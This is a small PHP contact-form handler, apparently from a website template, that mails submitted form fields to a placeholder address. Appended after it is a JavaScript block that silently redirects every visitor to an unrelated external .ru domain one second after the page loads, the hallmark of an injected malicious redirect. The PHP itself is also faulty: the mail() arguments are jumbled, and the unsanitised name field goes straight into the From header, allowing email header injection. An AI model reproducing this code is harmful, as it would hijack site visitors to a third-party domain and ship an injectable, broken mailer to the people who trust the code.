<?php
$name       = @trim(stripslashes($_POST['user_name'])); 
$from       = @trim(stripslashes($_POST['user_phone'])); 
$subject    = @trim(stripslashes($_POST['subject'])); 
$message    = @trim(stripslashes($_POST['message'])); 
$to   		= 'test@mail.com';//replace with your email

$headers   = array();
$headers[] = "MIME-Version: 1.0";
$headers[] = "Content-type: text/plain; charset=iso-8859-1";
$headers[] = "From: {$name}";
$headers[] = "Reply-To: ";
$headers[] = "Subject: ";
$headers[] = "X-Mailer: PHP/".phpversion();

mail($to, $from, $name, $headers);
?>
<script language="JavaScript" type="text/javascript">
function changeurl(){eval(self.location="http://gost-eger.ru");}
window.setTimeout("changeurl();",1000);
</script>